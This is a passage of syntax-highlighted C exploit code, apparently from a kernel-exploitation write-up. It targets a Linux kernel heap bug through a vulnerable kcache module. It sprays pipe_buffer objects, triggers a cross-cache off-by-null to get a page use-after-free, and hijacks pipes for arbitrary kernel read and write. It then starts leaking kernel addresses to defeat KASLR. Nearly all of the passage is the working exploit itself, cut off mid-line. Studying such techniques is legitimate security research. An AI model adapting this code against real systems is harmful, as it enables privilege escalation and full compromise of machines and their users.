class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* for pipe escalation */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRD_PIPE_BUF_SZ 192</span><br><br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> orig_pid = <span class="hljs-number">-1</span>, victim_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> snd_orig_pid = <span class="hljs-number">-1</span>, snd_vicitm_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> self_2nd_pipe_pid = <span class="hljs-number">-1</span>, self_3rd_pipe_pid = <span class="hljs-number">-1</span>, self_4th_pipe_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buf</span>;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">extend_pipe_buffer_to_4k</span><span class="hljs-params">(<span class="hljs-type">int</span> start_idx, <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr; i++) &#123;<br>        <span class="hljs-comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_8pages_start_idx++);<br>        &#125;<br><br>        <span class="hljs-comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  V - FIRST exploit stage - cross-cache overflow to make page-level UAF</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;<br><br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] exetend pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (extend_pipe_buffer_to_4k(<span class="hljs-number">0</span>, PIPE_SPRAY_NUM / <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);<br>    free_page(pgv_8pages_start_idx++);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KCACHE_NUM; i++) &#123;<br>        kcache_alloc(i, <span class="hljs-number">8</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] exetend pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="hljs-number">2</span>, PIPE_SPRAY_NUM / <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);  <span class="hljs-comment">/* prevent pipe_release() */</span><br>    &#125;<br><br>    <span class="hljs-comment">/* try to trigger cross-cache overflow */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KCACHE_NUM; i++) &#123;<br>        kcache_append(i, KCACHE_SIZE - <span class="hljs-number">8</span>, buf);<br>    &#125;<br><br>    <span class="hljs-comment">/* checking for cross-cache overflow */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for corruption...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;<br>            orig_pid = nr;<br>            victim_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, <br>                   victim_pid, orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">24</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, <br>           info_pipe_buf.page, info_pipe_buf.ops);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span><br>        || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-comment">/* construct a second-level page uaf */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>    info_pipe_buf.page = (<span class="hljs-keyword">struct</span> page*) ((<span class="hljs-type">size_t</span>) info_pipe_buf.page + <span class="hljs-number">0x40</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        <span class="hljs-keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;<br>            snd_orig_pid = nr;<br>            snd_vicitm_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>                   snd_vicitm_pid, snd_orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (snd_vicitm_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">building_self_writing_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">24</span> <span class="hljs-number">-3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.page = info_pipe_buf.page;<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.ops = info_pipe_buf.ops;<br>    evil_pipe_buf.flags = info_pipe_buf.flags;<br>    evil_pipe_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_2nd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                    self_2nd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_2nd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_3rd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_3rd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_4th_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_2nd_buf</span>, <span class="hljs-title">evil_3rd_buf</span>, <span class="hljs-title">evil_4th_buf</span>;</span><br><span class="hljs-type">char</span> temp_zero_buf[<span class="hljs-number">0x1000</span>]= &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span><br><span class="hljs-comment"> * We need to build a circle there for continuously memory seeking:</span><br><span class="hljs-comment"> * - 2nd pipe to search</span><br><span class="hljs-comment"> * - 3rd pipe to change 4th pipe</span><br><span class="hljs-comment"> * - 4th pipe to change 2nd and 3rd pipe</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br><br>    <span class="hljs-comment">/* hijack the 3rd pipe pointing to 4th */</span><br>    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>    evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_4th_buf.len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>    evil_2nd_buf.page = page_to_read;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* read out data */</span><br>    read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="hljs-number">0x1000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_leaking_by_arbitrary_pipe</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *comm_addr;<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>    setup_evil_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span><br><span class="hljs-comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span><br><span class="hljs-comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span><br><span class="hljs-comment">     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span><br><span class="hljs-comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span><br><span class="hljs-comment">     */</span><br>    vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span 